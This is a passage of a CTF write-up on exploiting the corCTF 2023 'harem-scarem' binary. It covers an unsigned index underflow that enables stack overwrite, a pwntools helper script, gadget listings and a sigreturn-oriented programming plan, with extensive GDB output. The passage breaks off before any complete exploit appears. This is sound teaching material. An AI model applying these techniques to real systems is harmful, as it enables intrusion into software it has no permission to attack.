---
layout: post
title: pwn/harem-scarem | corCTF 2023
description: Sigreturn-oriented programming with a quirky language
author: Alexander Zhang
tags: pwn ROP sigreturn
canonical: https://www.alexyzhang.dev/write-ups/corctf-2023/harem-scarem/
---

This write-up is also posted on my website at <https://www.alexyzhang.dev/write-ups/corctf-2023/harem-scarem/>.

## The Challenge

> Another year, another quirky language to pwn
>
> Author: clubby789

We're given a static binary and the following source code in a file named `main.ha`:

```hare
use fmt;
use bufio;
use bytes;
use os;
use strings;
use unix::signal;

const bufsz: u8 = 8;

type note = struct {
    title: [32]u8,
    content: [128]u8,
    init: bool,
};

fn ptr_forward(p: *u8) void = {
    if (*p == bufsz - 1) {
        fmt::println("error: out of bounds seek")!;
    } else {
        *p += 1;
    };
    return;
};

fn ptr_back(p: *u8) void = {
    if (*p - 1 < 0) {
        fmt::println("error: out of bounds seek")!;
    } else {  
        *p -= 1;
    };
    return;
};

fn note_add(note: *note) void = {
    fmt::print("enter your note title: ")!;
    bufio::flush(os::stdout)!;
    let title = bufio::scanline(os::stdin)! as []u8;
    let sz = if (len(title) >= len(note.title)) len(note.title) else len(title);
    note.title[..sz] = title[..sz];
    free(title);
    
    fmt::print("enter your note content: ")!;
    bufio::flush(os::stdout)!;
    let content = bufio::scanline(os::stdin)! as []u8;
    sz = if (len(content) >= len(note.content)) len(note.content) else len(content);
    note.content[..sz] = content[..sz];
    free(content);   
    note.init = true;
};

fn note_delete(note: *note) void = {
    if (!note.init) {
        fmt::println("error: no note at this location")!;
        return;
    };
    bytes::zero(note.title);
    bytes::zero(note.content);
    note.init = false;
    return;
};

fn note_read(note: *note) void = {
    if (!note.init) {
        fmt::println("error: no note at this location")!;
        return;
    };
    fmt::printfln("title: {}\ncontent: {}",
        strings::fromutf8_unsafe(note.title),
        strings::fromutf8_unsafe(note.content)
    )!;
    return;
};

fn handler(sig: int, info: *signal::siginfo, ucontext: *void) void = {
  fmt::println("goodbye :)")!;
  os::exit(1);
};

export fn main() void = {
    signal::handle(signal::SIGINT, &handler);
    let idx: u8 = 0;
    let opt: []u8 = [];
    let notes: [8]note = [
            note { title = [0...], content = [0...], init = false}...
    ];
    let notep: *[*]note = &notes;
    assert(bufsz == len(notes));
    for (true) {
        fmt::printf(
"1) Move note pointer forward
2) Move note pointer backward
3) Add note
4) Delete note
5) Read note
6) Exit
> ")!;
        bufio::flush(os::stdout)!;
        opt = bufio::scanline(os::stdin)! as []u8;
        defer free(opt);
        switch (strings::fromutf8(opt)!) {
            case "1" => ptr_forward(&idx);
            case "2" => ptr_back(&idx);
            case "3" => note_add(&notep[idx]);
            case "4" => note_delete(&notep[idx]);
            case "5" => note_read(&notep[idx]);
            case "6" => break;
            case => fmt::println("Invalid option")!;
        };
    };
};
```

Vim detected the file type as some language called [Hare](https://harelang.org/).
It looks kind of like Rust and it was pretty easy to read so I didn't bother looking at the Hare documentation.
The challenge also provided a Dockerfile which I didn't end up needing.

## Vulnerability

This seems to be a program for managing notes.
Each note contains a title and content stored in fixed-size arrays, and the notes are stored in an array on the stack.
While reading through the code, I noticed that the `if (*p - 1 < 0)` check is useless since `*p - 1` is unsigned and can never be negative.
We can therefore get the current note index to wrap around to 255 by decrementing it when it is 0.
I tried doing this and got a segfault when adding a new note, indicating that we can overwrite stack memory after the array:

<pre><code><span style="color:#C01C28"><b>gef➤  </b></span>r
Starting program: <span style="color:#26A269">/home/alex/harem-scarem/harem</span> 

This GDB supports auto-downloading debuginfo from the following URLs:
  &lt;<span style="color:#26A269">https://debuginfod.fedoraproject.org/</span>&gt;
Debuginfod has been disabled.
To make this setting permanent, add &apos;set debuginfod enabled off&apos; to .gdbinit.
1) Move note pointer forward
2) Move note pointer backward
3) Add note
4) Delete note
5) Read note
6) Exit
&gt; 2
1) Move note pointer forward
2) Move note pointer backward
3) Add note
4) Delete note
5) Read note
6) Exit
&gt; 3
enter your note title: foo

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#A2734C">rt.memmove</span> () at <span style="color:#26A269">/tmp/dcd1030ff3516291/temp.rt.1.s</span>:174
174 /tmp/dcd1030ff3516291/temp.rt.1.s: No such file or directory.

[ Legend: <span style="color:#C01C28"><b>Modified register</b></span> | <span style="color:#C01C28">Code</span> | <span style="color:#26A269">Heap</span> | <span style="color:#A347BA">Stack</span> | <span style="color:#A2734C">String</span> ]
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#005DD0">$rax   </span>: 0x0               
<span style="color:#C01C28"><b>$rbx   </b></span>: 0x800000007c57    
<span style="color:#C01C28"><b>$rcx   </b></span>: 0x6f              
<span style="color:#C01C28"><b>$rdx   </b></span>: 0x3               
<span style="color:#C01C28"><b>$rsp   </b></span>: <span style="color:#A347BA">0x00007fffffffda20</span>  →  <span style="color:#A347BA">0x00007fffffffdbe0</span>  →  <span style="color:#A347BA">0x00007fffffffe270</span>  →  <span style="color:#A347BA">0x00007fffffffe280</span>  →  <span style="color:#A347BA">0x00007fffffffe290</span>  →  0x0000000000000000
<span style="color:#C01C28"><b>$rbp   </b></span>: <span style="color:#A347BA">0x00007fffffffda20</span>  →  <span style="color:#A347BA">0x00007fffffffdbe0</span>  →  <span style="color:#A347BA">0x00007fffffffe270</span>  →  <span style="color:#A347BA">0x00007fffffffe280</span>  →  <span style="color:#A347BA">0x00007fffffffe290</span>  →  0x0000000000000000
<span style="color:#C01C28"><b>$rsi   </b></span>: 0x00007ffff7ef9020  →  0x00007ffff76f6f66
<span style="color:#C01C28"><b>$rdi   </b></span>: 0x800000007c57    
<span style="color:#C01C28"><b>$rip   </b></span>: <span style="color:#C01C28">0x0000000008015768</span>  →  <span style="color:#585858"><b>&lt;rt[memmove]+75&gt; mov BYTE PTR [rdi+r8*1], cl</b></span>
<span style="color:#C01C28"><b>$r8    </b></span>: 0x2               
<span style="color:#C01C28"><b>$r9    </b></span>: 0x1               
<span style="color:#C01C28"><b>$r10   </b></span>: 0x20              
<span style="color:#C01C28"><b>$r11   </b></span>: 0x216             
<span style="color:#C01C28"><b>$r12   </b></span>: 0x00007ffff7ef9020  →  0x00007ffff76f6f66
<span style="color:#005DD0">$r13   </span>: 0x0               
<span style="color:#005DD0">$r14   </span>: 0x0               
<span style="color:#005DD0">$r15   </span>: 0x0               
<span style="color:#C01C28"><b>$eflags</b></span>: [zero carry parity adjust sign trap <b>INTERRUPT</b> direction overflow <b>RESUME</b> virtualx86 identification]
<span style="color:#005DD0">$cs</span>: 0x33 <span style="color:#005DD0">$ss</span>: 0x2b <span style="color:#005DD0">$ds</span>: 0x00 <span style="color:#005DD0">$es</span>: 0x00 <span style="color:#005DD0">$fs</span>: 0x00 <span style="color:#005DD0">$gs</span>: 0x00 
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">stack</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#2AA1B3">0x00007fffffffda20</span>│+0x0000: <span style="color:#A347BA">0x00007fffffffdbe0</span>  →  <span style="color:#A347BA">0x00007fffffffe270</span>  →  <span style="color:#A347BA">0x00007fffffffe280</span>  →  <span style="color:#A347BA">0x00007fffffffe290</span>  →  0x0000000000000000   <span style="color:#005DD0"><b> ← $rsp, $rbp</b></span>
<span style="color:#2AA1B3">0x00007fffffffda28</span>│+0x0008: <span style="color:#C01C28">0x000000000800144e</span>  →  <span style="color:#585858"><b>&lt;note_add+880&gt; mov rdi, r12</b></span>
<span style="color:#2AA1B3">0x00007fffffffda30</span>│+0x0010: 0x0000000000000000
<span style="color:#2AA1B3">0x00007fffffffda38</span>│+0x0018: 0x0000000000000000
<span style="color:#2AA1B3">0x00007fffffffda40</span>│+0x0020: <span style="color:#A347BA">0x00007fffffffdab0</span>  →  0x00007ffff7ef9020  →  0x00007ffff76f6f66
<span style="color:#2AA1B3">0x00007fffffffda48</span>│+0x0028: 0x000000008d8f5fe7
<span style="color:#2AA1B3">0x00007fffffffda50</span>│+0x0030: 0x0000000000000017
<span style="color:#2AA1B3">0x00007fffffffda58</span>│+0x0038: <span style="color:#C01C28">0x0000000008005dd9</span>  →  <span style="color:#585858"><b>&lt;io[write]+271&gt; mov rcx, rax</b></span>
<span style="color:#585858"><b>─────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">code:x86:64</span><span style="color:#585858"><b> ────</b></span>
   <span style="color:#585858"><b> 0x801575d &lt;rt[memmove]+64&gt; sub    rcx, rax</b></span>
   <span style="color:#585858"><b> 0x8015760 &lt;rt[memmove]+67&gt; sub    rcx, 0x1</b></span>
   <span style="color:#585858"><b> 0x8015764 &lt;rt[memmove]+71&gt; movzx  ecx, BYTE PTR [rsi+rcx*1]</b></span>
 <span style="color:#26A269">→  0x8015768 &lt;rt[memmove]+75&gt; mov    BYTE PTR [rdi+r8*1], cl</span>
    0x801576c &lt;rt[memmove]+79&gt; add    rax, 0x1
    0x8015770 &lt;rt[memmove]+83&gt; jmp    0x8015748 &lt;rt.memmove+43&gt;
    0x8015772 &lt;rt[memmove]+85&gt; mov    eax, 0x0
    0x8015777 &lt;rt[memmove]+90&gt; cmp    rax, rdx
    0x801577a &lt;rt[memmove]+93&gt; jae    0x8015789 &lt;rt.memmove+108&gt;
<span style="color:#585858"><b>─────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#26A269"><b>#0</b></span>] Id 1, Name: &quot;harem&quot;, <span style="color:#C01C28"><b>stopped</b></span> <span style="color:#005DD0">0x8015768</span> in <span style="color:#A2734C"><b>rt.memmove</b></span> (), reason: <span style="color:#A347BA"><b>SIGSEGV</b></span>
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">trace</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#26A269"><b>#0</b></span>] 0x8015768 → <span style="color:#26A269">rt.memmove</span>()
[<span style="color:#A347BA"><b>#1</b></span>] 0x800144e → <span style="color:#26A269">note_add</span>()
[<span style="color:#A347BA"><b>#2</b></span>] 0x8000a54 → <span style="color:#26A269">main</span>()
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────────────────</b></span>
</code></pre>

## Exploitation

`checksec` showed that PIE is disabled.
It also said that there are RWX mappings for some reason but I didn't see any in GDB, so it looks like we have to use ROP.

<pre><code>[alex@ctf harem-scarem]$ checksec harem 
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/alex/harem-scarem/harem&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#C01C28">No RELRO</span>
    Stack:    <span style="color:#C01C28">No canary found</span>
    NX:       <span style="color:#C01C28">NX disabled</span>
    PIE:      <span style="color:#C01C28">No PIE (0x7fff000)</span>
    RWX:      <span style="color:#C01C28">Has RWX segments</span>
</code></pre>

<pre><code><span style="color:#26A269"><b>gef➤  </b></span>vm
[ Legend:  <span style="color:#C01C28">Code</span> | <span style="color:#26A269">Heap</span> | <span style="color:#A347BA">Stack</span> ]
<span style="color:#005DD0">Start              End                Offset             Perm Path</span>
<span style="color:#C01C28">0x0000000007fff000</span> <span style="color:#C01C28">0x000000000801b000</span> <span style="color:#C01C28">0x0000000000000000</span> <span style="color:#C01C28">r-x</span> <span style="color:#C01C28">/home/alex/harem-scarem/harem</span>
0x0000000080000000 0x0000000080007000 0x000000000001c000 rw- /home/alex/harem-scarem/harem
<span style="color:#26A269">0x0000000080007000</span> <span style="color:#26A269">0x0000000080010000</span> <span style="color:#26A269">0x0000000000000000</span> <span style="color:#26A269">rw-</span> <span style="color:#26A269">[heap]</span>
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
<span style="color:#C01C28">0x00007ffff7ffd000</span> <span style="color:#C01C28">0x00007ffff7fff000</span> <span style="color:#C01C28">0x0000000000000000</span> <span style="color:#C01C28">r-x</span> <span style="color:#C01C28">[vdso]</span>
<span style="color:#A347BA">0x00007ffffffde000</span> <span style="color:#A347BA">0x00007ffffffff000</span> <span style="color:#A347BA">0x0000000000000000</span> <span style="color:#A347BA">rw-</span> <span style="color:#A347BA">[stack]</span>
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
</code></pre>

### Return Address

First, I had to figure out how to overwrite the return address of `main`.
I did this mostly by trial and error where I tried writing notes to various out-of-bounds note indices until I got a segfault on a `ret` instruction with `rsp` pointing to the contents of the note.
I used a simple script like this to set the note index:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./harem")

context.binary = exe

r = process([exe.path])
gdb.attach(r)

for _ in range(246):
    r.sendlineafter(b"> ", b"2")

r.interactive()
```

Then I used GEF's `pattern` command to find the offset in the note that corresponds to the return address:

<pre><code>[<span style="color:#005DD0"><b>*</b></span>] Switching to interactive mode
1) Move note pointer forward
2) Move note pointer backward
3) Add note
4) Delete note
5) Read note
6) Exit
&gt; <span style="color:#C01C28"><b>$</b></span> 3
enter your note title: <span style="color:#C01C28"><b>$</b></span> 
enter your note content: <span style="color:#C01C28"><b>$</b></span> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
1) Move note pointer forward
2) Move note pointer backward
3) Add note
4) Delete note
5) Read note
6) Exit
&gt; <span style="color:#C01C28"><b>$</b></span> 6
</code></pre>

<pre><code>Program received signal SIGSEGV, Segmentation fault.
<span style="color:#A2734C">main</span> () at <span style="color:#26A269">/tmp/3212512f44fd4eab/temp..23.s</span>:606
606 /tmp/3212512f44fd4eab/temp..23.s: No such file or directory.

[ Legend: <span style="color:#C01C28"><b>Modified register</b></span> | <span style="color:#C01C28">Code</span> | <span style="color:#26A269">Heap</span> | <span style="color:#A347BA">Stack</span> | <span style="color:#A2734C">String</span> ]
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#C01C28"><b>$rax   </b></span>: 0x000000008000a8e0  →  0x00007f85b16d5010  →  0x00007f85b16d5020  →  0x00007f85b16d5030  →  0x00007f85b16d5040  →  0x00007f85b16d5050  →  0x00007f85b16d5060  →  0x00007f85b16d5070
<span style="color:#C01C28"><b>$rbx   </b></span>: 0x0               
<span style="color:#C01C28"><b>$rcx   </b></span>: 0x0               
<span style="color:#C01C28"><b>$rdx   </b></span>: 0x0               
<span style="color:#C01C28"><b>$rsp   </b></span>: <span style="color:#A347BA">0x00007ffd9f22f468</span>  →  <span style="color:#A2734C">&quot;aadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa[...]&quot;</span>
<span style="color:#C01C28"><b>$rbp   </b></span>: 0x6161616161636161 (&quot;<span style="color:#A2734C">aacaaaaa</span>&quot;?)
<span style="color:#C01C28"><b>$rsi   </b></span>: 0x8               
<span style="color:#C01C28"><b>$rdi   </b></span>: 0x00007f85b16d5010  →  0x00007f85b16d5020  →  0x00007f85b16d5030  →  0x00007f85b16d5040  →  0x00007f85b16d5050  →  0x00007f85b16d5060  →  0x00007f85b16d5070  →  0x00007f85b16d5080
<span style="color:#C01C28"><b>$rip   </b></span>: <span style="color:#C01C28">0x00000000080009e3</span>  →  <span style="color:#585858"><b>&lt;main+2516&gt; ret </b></span>
<span style="color:#C01C28"><b>$r8    </b></span>: 0x36              
<span style="color:#005DD0">$r9    </span>: 0x1               
<span style="color:#005DD0">$r10   </span>: 0x20              
<span style="color:#005DD0">$r11   </span>: 0x216             
<span style="color:#C01C28"><b>$r12   </b></span>: 0x0               
<span style="color:#005DD0">$r13   </span>: 0x0               
<span style="color:#005DD0">$r14   </span>: 0x0               
<span style="color:#005DD0">$r15   </span>: 0x0               
<span style="color:#C01C28"><b>$eflags</b></span>: [zero <b>CARRY</b> parity <b>ADJUST</b> <b>SIGN</b> trap <b>INTERRUPT</b> direction overflow <b>RESUME</b> virtualx86 identification]
<span style="color:#005DD0">$cs</span>: 0x33 <span style="color:#005DD0">$ss</span>: 0x2b <span style="color:#005DD0">$ds</span>: 0x00 <span style="color:#005DD0">$es</span>: 0x00 <span style="color:#005DD0">$fs</span>: 0x00 <span style="color:#005DD0">$gs</span>: 0x00 
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">stack</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#2AA1B3">0x00007ffd9f22f468</span>│+0x0000: <span style="color:#A2734C">&quot;aadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa[...]&quot;</span>  <span style="color:#005DD0"><b> ← $rsp</b></span>
<span style="color:#2AA1B3">0x00007ffd9f22f470</span>│+0x0008: <span style="color:#A2734C">&quot;aaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa[...]&quot;</span>
<span style="color:#2AA1B3">0x00007ffd9f22f478</span>│+0x0010: <span style="color:#A2734C">&quot;aafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaa[...]&quot;</span>
<span style="color:#2AA1B3">0x00007ffd9f22f480</span>│+0x0018: <span style="color:#A2734C">&quot;aagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa[...]&quot;</span>
<span style="color:#2AA1B3">0x00007ffd9f22f488</span>│+0x0020: <span style="color:#A2734C">&quot;aahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaa[...]&quot;</span>
<span style="color:#2AA1B3">0x00007ffd9f22f490</span>│+0x0028: <span style="color:#A2734C">&quot;aaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaa[...]&quot;</span>
<span style="color:#2AA1B3">0x00007ffd9f22f498</span>│+0x0030: <span style="color:#A2734C">&quot;aajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaa[...]&quot;</span>
<span style="color:#2AA1B3">0x00007ffd9f22f4a0</span>│+0x0038: <span style="color:#A2734C">&quot;aakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa[...]&quot;</span>
<span style="color:#585858"><b>─────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">code:x86:64</span><span style="color:#585858"><b> ────</b></span>
   <span style="color:#585858"><b> 0x80009d9 &lt;main+2506&gt;      mov    rdi, QWORD PTR [rbp-0x50]</b></span>
   <span style="color:#585858"><b> 0x80009dd &lt;main+2510&gt;      call   0x80159b6 &lt;rt.free&gt;</b></span>
   <span style="color:#585858"><b> 0x80009e2 &lt;main+2515&gt;      leave  </b></span>
 <span style="color:#26A269">→  0x80009e3 &lt;main+2516&gt;      ret    </span>
<span style="color:#C01C28"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#585858"><b>─────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#26A269"><b>#0</b></span>] Id 1, Name: &quot;harem&quot;, <span style="color:#C01C28"><b>stopped</b></span> <span style="color:#005DD0">0x80009e3</span> in <span style="color:#A2734C"><b>main</b></span> (), reason: <span style="color:#A347BA"><b>SIGSEGV</b></span>
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">trace</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#26A269"><b>#0</b></span>] 0x80009e3 → <span style="color:#26A269">main</span>()
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────────────────</b></span>
<span style="color:#26A269"><b>gef➤  </b></span>pattern search $rsp
<span style="color:#005DD0"><b>[+]</b></span> Searching for &apos;6161646161616161&apos;/&apos;6161616161646161&apos; with period=8
<span style="color:#26A269"><b>[+]</b></span> Found at offset 22 (little-endian search) <span style="color:#C01C28"><b>likely</b></span>
</code></pre>

### Gadgets

Now that I could overwrite the return address, I looked at the available gadgets.
There is a `syscall` gadget, but I didn't see any gadgets for controlling `rdi`, `rsi`, `rdx`, and `rax`:

<pre><code>[alex@ctf harem-scarem]$ xgadget --reg-pop harem
TARGET <span style="color:#C01C28">0</span> - <span style="color:#C061CB">&apos;</span><span style="color:#2AA1B3">harem</span><span style="color:#C061CB">&apos;:</span> <span style="color:#A2734C">ELF</span><span style="color:#C061CB">-</span><span style="color:#A2734C">X64</span><span style="color:#C061CB">,</span> <span style="color:#26A269">0x00000008000000</span> entry<span style="color:#C061CB">,</span> <span style="color:#2A7BDE">111848</span><span style="color:#C061CB">/</span><span style="color:#2A7BDE">1</span> executable bytes<span style="color:#C061CB">/</span>segments 

<span style="color:#26A269">0x000000080017d9</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">r12</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000008001f94</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">r13</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">r12</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000008001f95</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbp</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">r12</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000008000f6d</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000080017da</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>

<span style="color:#C061CB">CONFIG</span> [ search: <span style="color:#2A7BDE">Register-pop-only</span> | x_match: <span style="color:#2A7BDE">none</span> | max_len: <span style="color:#2A7BDE">5</span> | syntax: <span style="color:#2A7BDE">Intel</span> | regex_filter: <span style="color:#2A7BDE">none</span> ]
<span style="color:#C061CB">RESULT</span> [ unique_gadgets: <span style="color:#2A7BDE">5</span> | search_time: <span style="color:#2A7BDE">12.8595ms</span> | print_time: <span style="color:#2A7BDE">2.368572ms</span> ]
</code></pre>

Many of the gadgets had `leave` instructions which would mess up `rsp`, and the binary didn't contain a `system` function or a `/bin/sh` string, which I checked for using GEF's `grep` command.

### Sigreturn

At some point I remembered learning about `sigreturn`, which is a syscall that can be used to control all of the registers.
It is normally used to return from signal handlers, and it restores the state of the registers from a structure on the top of the stack.
If I can set `eax` to 0xf, the syscall number for `sigreturn`, then I can invoke `sigreturn` with a fake frame on the stack containing the register values that I want.
I looked at the gadget list again and found a convenient `sigreturn` gadget:

<pre><code><span style="color:#26A269">0x0000000801a4ac</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0xf</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">syscall</span><span style="color:#C061CB">; </span>
</code></pre>

Now I have control over all of the registers!

### /bin/sh

What's missing now is a `/bin/sh` string in memory at some known address.
I considered leaking a stack pointer with an out-of-bound read, but I couldn't find a stack pointer on the stack that was aligned with the start of the title or content of a note.
While looking at the process's memory mappings, I decided to check if the input data passes through a buffer with a fixed address at some point.
I had already tried entering a string and then searching for it in memory with GEF's `grep` command, but I realized that the beginning of the string might get overwritten when the buffer is reused or its heap chunk is freed.
Therefore I tried adding some padding at the beginning of the string, and now it appears at a constant address even with ASLR on:

<pre><code><span style="color:#C01C28"><b>gef➤  </b></span>r
Starting program: <span style="color:#26A269">/home/alex/harem-scarem/harem</span> 
1) Move note pointer forward
2) Move note pointer backward
3) Add note
4) Delete note
5) Read note
6) Exit
&gt; 3
enter your note title:                                 
enter your note content: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafoobar
1) Move note pointer forward
2) Move note pointer backward
3) Add note
4) Delete note
5) Read note
6) Exit
&gt; 5

Breakpoint 1, <span style="color:#A2734C">note_read</span> () at <span style="color:#26A269">/tmp/3212512f44fd4eab/temp..23.s</span>:829
829	in <span style="color:#26A269">/tmp/3212512f44fd4eab/temp..23.s</span>

[ Legend: <span style="color:#C01C28"><b>Modified register</b></span> | <span style="color:#C01C28">Code</span> | <span style="color:#26A269">Heap</span> | <span style="color:#A347BA">Stack</span> | <span style="color:#A2734C">String</span> ]
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#C01C28"><b>$rax   </b></span>: <span style="color:#A347BA">0x00007ffe18de23e8</span>  →  0x0000000000000000
<span style="color:#005DD0">$rbx   </span>: 0x0               
<span style="color:#005DD0">$rcx   </span>: 0x0               
<span style="color:#C01C28"><b>$rdx   </b></span>: 0x00007f004682c010  →  0x00007f004682c035  →  <span style="color:#C01C28">0x000000000800007f</span>  →  <span style="color:#585858"><b>&lt;main+112&gt; add BYTE PTR [rax], al</b></span>
<span style="color:#C01C28"><b>$rsp   </b></span>: <span style="color:#A347BA">0x00007ffe18de23d8</span>  →  <span style="color:#C01C28">0x0000000008000a08</span>  →  <span style="color:#585858"><b>&lt;main+2553&gt; jmp 0x8000a70 &lt;main+2657&gt;</b></span>
<span style="color:#C01C28"><b>$rbp   </b></span>: <span style="color:#A347BA">0x00007ffe18de2a60</span>  →  <span style="color:#A347BA">0x00007ffe18de2a70</span>  →  <span style="color:#A347BA">0x00007ffe18de2a80</span>  →  0x0000000000000000
<span style="color:#C01C28"><b>$rsi   </b></span>: <span style="color:#C01C28">0x0000000080000100</span>  →  0x0000000000000035 (&quot;<span style="color:#A2734C">5</span>&quot;?)
<span style="color:#C01C28"><b>$rdi   </b></span>: <span style="color:#A347BA">0x00007ffe18de23e8</span>  →  0x0000000000000000
<span style="color:#C01C28"><b>$rip   </b></span>: <span style="color:#C01C28">0x0000000008000cbf</span>  →  <span style="color:#585858"><b>&lt;note_read+0&gt; push rbp</b></span>
<span style="color:#C01C28"><b>$r8    </b></span>: 0x35              
<span style="color:#C01C28"><b>$r9    </b></span>: 0x1               
<span style="color:#C01C28"><b>$r10   </b></span>: 0x20              
<span style="color:#C01C28"><b>$r11   </b></span>: 0x216             
<span style="color:#005DD0">$r12   </span>: 0x0               
<span style="color:#005DD0">$r13   </span>: 0x0               
<span style="color:#005DD0">$r14   </span>: 0x0               
<span style="color:#005DD0">$r15   </span>: 0x0               
<span style="color:#C01C28"><b>$eflags</b></span>: [zero carry <b>PARITY</b> adjust sign trap <b>INTERRUPT</b> direction overflow resume virtualx86 identification]
